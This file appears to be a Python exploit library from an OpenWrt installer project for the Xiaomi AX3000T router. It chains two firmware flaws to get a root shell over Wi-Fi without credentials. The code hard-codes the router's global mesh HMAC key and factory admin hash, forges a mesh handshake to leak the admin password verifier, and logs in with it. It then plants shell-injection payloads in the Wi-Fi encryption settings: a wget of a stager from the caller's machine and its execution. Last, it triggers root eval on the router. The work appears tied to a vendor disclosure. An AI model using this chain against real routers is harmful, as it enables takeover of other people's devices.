#!/usr/bin/env python3
"""Xiaomi AX3000T (RD03v2) stock 2.0.28 -> root, as a reusable library.

This is the exploitation half of the OpenWrt installer: everything needed to
take a factory unit from the setup wizard to a root shell over Wi-Fi, with no
cable and no credentials.  It is a self-contained re-implementation of the
`cab_meshd` chain (V1 admin takeover + V2 encryption-field injection) rather
than an import of the disclosure package, so the installer can ship publicly
without carrying the vendor-only advisory tree around with it.

The mechanics are documented in the disclosure package; the short version:

  V1  cab_meshd authenticates mesh peers with a hard-coded, firmware-global
      HMAC key and TLS that verifies no client certificate.  Reaching
      ST_RUNNING makes the CAP transmit `web_passwd256` -- the exact SHA-256
      the web login checks -- to the peer.  sha256(nonce||web_passwd256) is
      then a valid admin login.

  V2  `encryption` is on hackCheck's exemption list, so the admin API writes
      arbitrary shell metacharacters into wireless.<iface>.encryption.
      do_cap_init reads that back with `uci get` -- unlaundered -- and hands
      it to mimesh_init.sh:717's `eval`, as root.

Two properties shape every caller of this module:

  * cab_meshd's CAP instance only starts when xiaoqiang.common.INITTED=YES,
    and its init script runs at boot only (START=99).  A factory unit
    therefore needs `initialise()` plus a reboot before 19553 exists at all.

  * the trigger is ONE-SHOT.  The first cap_init persists NETMODE=whc_cap,
    which gates the sink until a factory reset.  Whatever the payload needs
    to accomplish, it accomplishes on the first firing or not at all --
    hence the "fetch everything, then establish a durable channel" shape of
    the stagers built on top of this.
"""

import base64
import hashlib
import hmac
import json
import random
import re
import socket
import ssl
import struct
import subprocess
import time
import urllib.error
import urllib.parse
import urllib.request

# ---- firmware constants -----------------------------------------------------

# The mesh authenticator, literal @0xcabb in /usr/sbin/cab_meshd.  Identical on
# every RD03v2 of this firmware and present in sibling XiaoQiang mesh models.
MESH_KEY = b"838d364d8ed3bd085e150211ea6b3715"
MESH_PORT = 19553
MESH_VER = 0x1001
MESH_HDR = 0x2C

# /etc/config/account "config core 'common'" -> option 'admin'.  The shipped
# value, so it authenticates any unit on which no admin password has ever been
# set -- i.e. anything still on the setup wizard.
FACTORY_ADMIN_HASH = (
    "73a1d6d01003067844cd148b1502a24bb8a305c93dfef55f983da80fa8cdfa24"
)

# The LuCI Lua backend behind nginx serialises requests and a cold call on an
# idle unit measures ~9s.  Being impatient here means half-sending a
# state-changing POST, which is worse than waiting.
HTTP_TIMEOUT = 45
HTTP_RETRIES = 4
HTTP_RETRY_DELAY = 6


class ChainError(Exception):
    """Anything that should stop the caller rather than be retried."""


_LOG_SINK = None


def log(msg):
    print(msg, flush=True)
    if _LOG_SINK is not None:
        _LOG_SINK.write(msg + "\n")
        _LOG_SINK.flush()


def set_log_sink(fh):
    """Tee every log line into `fh` as well (the probe keeps a transcript)."""
    global _LOG_SINK
    _LOG_SINK = fh


# ---- http -------------------------------------------------------------------


def http_call(url, data=None, timeout=HTTP_TIMEOUT, retries=HTTP_RETRIES):
    """POST if `data` is given, else GET.  Retries transport errors only.

    Every call site in this module is idempotent -- login just mints a stok,
    setInited() is a no-op the second time, and the UCI writes are absolute --
    so a replayed request cannot compound.
    """
    body = urllib.parse.urlencode(data).encode() if data is not None else None
    req = urllib.request.Request(url, data=body)
    req.add_header("User-Agent", "Mozilla/5.0")
    req.add_header("Connection", "close")
    if body is not None:
        req.add_header("Content-Type", "application/x-www-form-urlencoded")
    last = None
    for attempt in range(1, retries + 1):
        try:
            with urllib.request.urlopen(req, timeout=timeout) as r:
                return r.read().decode("utf-8", "replace")
        except (urllib.error.URLError, TimeoutError, socket.timeout, OSError) as e:
            last = e
            if attempt < retries:
                log(f"    (retry {attempt}/{retries}: {type(e).__name__})")
                time.sleep(HTTP_RETRY_DELAY)
    raise ChainError(f"{url} unreachable after {retries} attempts: {last}")


def http_json(url, data=None, **kw):
    raw = http_call(url, data, **kw)
    try:
        return json.loads(raw)
    except json.JSONDecodeError:
        raise ChainError(f"non-JSON reply from {url}:\n{raw[:400]}")


def api(host, stok, path, params=None):
    """Authenticated LuCI API call."""
    return http_json(
        f"http://{host}/cgi-bin/luci/;stok={stok}/{path}", params
    )


# ---- local host detection ---------------------------------------------------


def _route_field(host, field):
    try:
        out = subprocess.run(
            ["ip", "-o", "route", "get", host],
            capture_output=True, text=True, timeout=5,
        ).stdout
        m = re.search(rf"\b{field}\s+(\S+)", out)
        return m.group(1) if m else None
    except Exception:
        return None


def local_ip(host):
    """Source address this machine uses to reach `host` -- the address the
    device will call back to, so it gets baked into the stager."""
    return _route_field(host, "src")


def local_interface(host):
    """Interface this machine uses to reach the stock router."""
    return _route_field(host, "dev")


def local_mac(host):
    """MAC of the egress interface.  checkNonce only uses it to pick a replay
    slot -- it compares against the real remote MAC purely to log a line -- so
    an approximation is fine, but the real one keeps the logs honest."""
    dev = _route_field(host, "dev")
    if dev:
        try:
            with open(f"/sys/class/net/{dev}/address") as fh:
                return fh.read().strip()
        except OSError:
            pass
    return "00:00:00:00:00:00"


def port_open(host, port, timeout=3):
    try:
        with socket.create_connection((host, port), timeout=timeout):
            return True
    except OSError:
        return False


# ---- phase 0: pre-flight (unauthenticated) ----------------------------------


def init_info(host):
    """GET api/xqsystem/init_info -- unauthenticated, read-only, zero footprint.

    This is the whole pre-flight budget available before touching anything:
    hardware revision, ROM version and the INITTED bit.
    """
    return http_json(f"http://{host}/cgi-bin/luci/api/xqsystem/init_info")


# ---- phase 1: complete the wizard so cab_meshd starts -----------------------


def make_nonce(mac, ntype=0):
    """<type>_<mac>_<time>_<rand>; checkNonce wants exactly four fields,
    type <= 4, and a time strictly greater than the last one seen for this
    (type, mac) pair.  A live UNIX timestamp satisfies the replay guard."""
    return f"{ntype}_{mac}_{int(time.time())}_{random.randint(0, 9999)}"


def login(host, stored_hash, mac=None):
    """jsonauth: sha256(nonce || <stored account value>) -> stok."""
    mac = mac or local_mac(host)
    nonce = make_nonce(mac)
    password = hashlib.sha256((nonce + stored_hash).encode()).hexdigest()
    res = http_json(
        f"http://{host}/cgi-bin/luci/api/xqsystem/login",
        {"username": "admin", "password": password, "nonce": nonce},
    )
    if res.get("code") != 0 or not res.get("token"):
        raise ChainError(
            f"login rejected: {res} -- code 401 means temporarily banned; "
            "otherwise the stored admin hash is not the factory one "
            "(an admin password has been set) and V1 is the way in"
        )
    return res["token"]


def initialise(host, ssid=None, reboot=True, wait=300):
    """Flip xiaoqiang.common.INITTED so cab_meshd's CAP instance starts.

    router_init -> setRouter() treats every configuration block as optional but
    calls setSPwd()/setInited() unconditionally, so submitting the SSID alone
    leaves the Wi-Fi key, the admin password and the WAN exactly as they are.
    That matters because this runs over that same Wi-Fi: changing the key here
    would disconnect the caller mid-request.  forkRestartWifi() is likewise
    gated on a config having actually changed, so the radios never bounce.

    setInited() restarts meshd but not cab_meshd, whose init script is
    START=99 (boot only) -- hence the reboot.
    """
    info = init_info(host)
    log(
        f"[1] {info.get('hardware')} rom {info.get('romversion')} "
        f"inited={info.get('inited')} name={info.get('routername')!r}"
    )
    if info.get("newEncryptMode") != 1:
        raise ChainError(
            f"newEncryptMode={info.get('newEncryptMode')}; this path assumes "
            "the sha256 scheme (getEncryptMode()==1)"
        )
    ssid = ssid or info.get("routername")
    if not ssid:
        raise ChainError("could not determine an SSID to submit; pass one")

    stok = login(host, FACTORY_ADMIN_HASH)
    log(f"[1] logged in with the factory account hash, stok={stok}")
    res = api(host, stok, "api/xqsystem/router_init",
              {"wifi24Ssid": ssid, "wifi50Ssid": ssid})
    # setSPwd()/setInited() run even when `code` reports a validation error on
    # a block we did not submit, so a non-zero code here is informational.
    log(f"[1] router_init (SSID only, nothing else touched) -> {res}")

    time.sleep(2)
    after = init_info(host)
    if after.get("inited") != 1:
        raise ChainError(f"inited is still {after.get('inited')}; setInited() did not take")
    log("[1] INITTED=YES")

    if not reboot:
        return stok
    log("[1] rebooting so cab_meshd starts")
    try:
        http_call(f"http://{host}/cgi-bin/luci/;stok={stok}/api/xqsystem/reboot",
                  {}, timeout=10, retries=1)
    except ChainError:
        pass  # expected: the box drops the connection as it goes down
    time.sleep(20)
    if not wait_for_mesh(host, wait):
        raise ChainError(
            f"tcp/{MESH_PORT} still closed after {wait}s -- check NETMODE "
            "(the init script skips whc_re / wifiapmode / cpe_bridgemode)"
        )
    return None


def wait_for_mesh(host, deadline_s=300):
    log(f"[1] waiting up to {deadline_s}s for tcp/{MESH_PORT}")
    end = time.time() + deadline_s
    while time.time() < end:
        if port_open(host, MESH_PORT):
            log(f"[1] tcp/{MESH_PORT} open -- cab_meshd is in CAP mode")
            return True
        time.sleep(5)
    return False


# ---- mesh protocol primitives ----------------------------------------------


def _q_pass(ident: bytes) -> bytes:
    """HMAC-SHA256 under the 'q' key variant (server-verify-incoming)."""
    return base64.b64encode(
        hmac.new(b"q" + MESH_KEY[1:], ident, hashlib.sha256).digest()
    )


def _hdr(typ, blen):
    h = bytearray(MESH_HDR)
    h[0:2] = struct.pack(">H", MESH_VER)
    h[2:4] = struct.pack(">H", blen)
    h[4:6] = struct.pack(">H", typ)
    return bytes(h)


def _tls(host, port=MESH_PORT, timeout=20.0, retries=4):
    """TLS to cab_meshd presenting no client certificate.

    The daemon has a small number of connection slots and stalls rather than
    refusing when they are busy, so a failed connect is usually "try again in
    a moment", not "not listening".
    """
    ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    try:
        ctx.set_ciphers("ALL:@SECLEVEL=0")
    except ssl.SSLError:
        pass
    for i in range(retries):
        try:
            return ctx.wrap_socket(socket.create_connection((host, port), timeout=timeout))
        except (TimeoutError, socket.timeout, ssl.SSLError, OSError) as e:
            if i == retries - 1:
                raise ChainError(f"TLS to {host}:{port} failed: {type(e).__name__}: {e}")
            log(f"    (TLS {i+1}/{retries}: {type(e).__name__}; slot busy, waiting 15s)")
            time.sleep(15)


def _auth(sock, ident: bytes):
    """type-4: identity at body[0], forged HMAC at body[0x10]."""
    b = bytearray(0xA4)
    b[0:len(ident)] = ident
    p = _q_pass(ident)
    b[0x10:0x10 + len(p)] = p
    sock.sendall(_hdr(4, len(b)) + bytes(b))


def _running(sock):
    """type-5 drives the state machine to ST_RUNNING."""
    b = bytearray(0x20)
    b[0] = 1
    sock.sendall(_hdr(5, len(b)) + bytes(b))


# ---- phase 2a: V1, leak the admin verifier ---------------------------------


def leak_web_passwd256(host, ident=b"ota0001", timeout=20.0):
    """Forge the handshake and read web_passwd256 out of the sync config.

    Read-only against the device: no type-7, so cap_init never fires and the
    one-shot stays armed.
    """
    s = _tls(host, timeout=timeout)
    log(f"[2] TLS up ({s.version()}, no client cert)")
    _auth(s, ident)
    log("[2] type-4 auth sent (forged constant-key HMAC)")
    time.sleep(1.0)
    _running(s)
    log("[2] type-5 -> ST_RUNNING; waiting for the sync config")

    buf = b""
    cfg = None
    s.settimeout(1.0)
    deadline = time.time() + 8.0
    while time.time() < deadline and cfg is None:
        try:
            chunk = s.recv(4096)
        except (socket.timeout, ssl.SSLWantReadError):
            continue
        except OSError:
            break
        if not chunk:
            break
        buf += chunk
        while len(buf) >= MESH_HDR:
            _, blen, typ = struct.unpack(">HHH", buf[0:6])
            if len(buf) < MESH_HDR + blen:
                break
            body, buf = buf[MESH_HDR:MESH_HDR + blen], buf[MESH_HDR + blen:]
            if typ == 6:
                js, je = body.find(b"{"), body.rfind(b"}")
                if js != -1 and je > js:
                    cfg = json.loads(body[js:je + 1])
    try:
        s.close()
    except OSError:
        pass
    if cfg is None:
        raise ChainError("no sync config received; is the target a CAP (INITTED=YES)?")
    h = cfg.get("web_passwd256", "")
    if not h:
        raise ChainError(f"sync config carried no web_passwd256: {list(cfg)}")
    return h, cfg


def admin_session(host, ident=b"ota0001", timeout=20.0):
    """V1 end to end: leak the verifier, mint an admin stok."""
    h256, cfg = leak_web_passwd256(host, ident, timeout)
    log(f"[2] leaked web_passwd256 = {h256[:16]}...")
    stok = login(host, h256)
    log(f"[2] admin session minted: stok={stok}")
    return stok, cfg


# ---- phase 2b: V2, plant and trigger ---------------------------------------


def read_wifi(host, stok):
    """Current radio config, captured before planting so the stager can put it
    back byte for byte.  cap_init reconfigures the AP from the values we are
    about to poison, so without this the box comes back with a Wi-Fi nobody
    knows the key to -- on a Wi-Fi-only install that is a lost device."""
    info = api(host, stok, "api/xqnetwork/wifi_detail_all")
    bands = []
    for w in info.get("info", []):
        bands.append({
            "ifname": w.get("ifname", ""),
            "ssid": w.get("ssid", ""),
            "encryption": w.get("encryption", ""),
            "password": w.get("password", ""),
            "channel": w.get("channelInfo", {}).get("channel", ""),
        })
    return bands


def require_cap_sink_ready(host, stok):
    """Fail before planting unless the V2 CAP path is in its tested state."""
    res = api(host, stok, "api/xqnetwork/get_netmode")
    netmode = res.get("netmode")
    if netmode != 0:
        raise ChainError(
            f"V2 CAP path is unavailable (netmode={netmode!r}). Factory-reset "
            "the router, leave the Xiaomi setup wizard untouched, reconnect "
            "to its factory network, and run the installer again.")
    return netmode


def plant(host, stok, attacker_ip, serve_port, bands, stager_path="/s"):
    """Write the two-stage payload into the 2.4/5 GHz `encryption` keys.

    set_wifi_without_restart writes UCI without bouncing the radios, so the
    device stays reachable between the plant and the trigger.  The SSID is
    re-submitted unchanged so nothing visible changes.

    The 2.4 GHz value carries the fetch, the 5 GHz value the exec; both are
    recognisable by content later, which is how the stager works out which
    band it is repairing without needing a band->section map it cannot get
    before it has root.
    """
    ssid24 = bands[0]["ssid"] if len(bands) > 0 else "MiWiFi"
    ssid5 = bands[1]["ssid"] if len(bands) > 1 else ssid24
    log(f"[3] SSIDs preserved: 2.4G={ssid24!r} 5G={ssid5!r}")

    p_fetch = (f'\\" wget http://{attacker_ip}:{serve_port}'
               f'{stager_path} -O /tmp/x #')
    p_exec = '\\" sh /tmp/x #'

    r1 = api(host, stok, "api/xqnetwork/set_wifi_without_restart",
             {"wifiIndex": "1", "ssid": ssid24, "pwd": "meshpoc12345",
              "encryption": p_fetch})
    log(f"[3] 2.4G encryption planted -> {r1}")
    r2 = api(host, stok, "api/xqnetwork/set_wifi_without_restart",
             {"wifiIndex": "2", "ssid": ssid5, "pwd": "meshpoc12345",
              "encryption": p_exec})
    log(f"[3] 5G encryption planted   -> {r2}")

    seen = 0
    for w in api(host, stok, "api/xqnetwork/wifi_detail_all").get("info", []):
        enc = w.get("encryption", "")
        if "wget" in enc or "sh /tmp" in enc:
            seen += 1
            log(f"[3] read-back ok: encryption={enc!r}")
    if seen < 2:
        raise ChainError(
            f"only {seen}/2 payloads survived read-back -- hackCheck may have "
            "filtered them; do not fire the trigger, it is one-shot"
        )


def trigger(host, ident=b"ota0001", timeout=20.0, settle=4.0):
    """type-4 -> type-5 -> type-7.  cap_init reads the poisoned UCI values and
    hands them to mimesh_init.sh:717's eval, as root.

    ONE-SHOT: cap_init persists NETMODE=whc_cap, which gates the sink until a
    factory reset.  Everything the payload will ever do, it does now.
    """
    s = _tls(host, timeout=timeout)
    log(f"[4] TLS up ({s.version()})")
    _auth(s, ident)
    log("[4] type-4 auth sent")
    time.sleep(1.0)
    _running(s)
    log("[4] type-5 -> ST_RUNNING")
    time.sleep(1.5)
    s.settimeout(2.0)
    try:
        s.recv(4096)
    except (socket.timeout, ssl.SSLWantReadError, OSError):
        pass
    b = bytearray(0x110)
    b[0] = 1
    s.sendall(_hdr(7, len(b)) + bytes(b))
    log("[4] type-7 sent -> cap_init -> mimesh_init eval (root)")
    time.sleep(settle)
    try:
        s.close()
    except OSError:
        pass
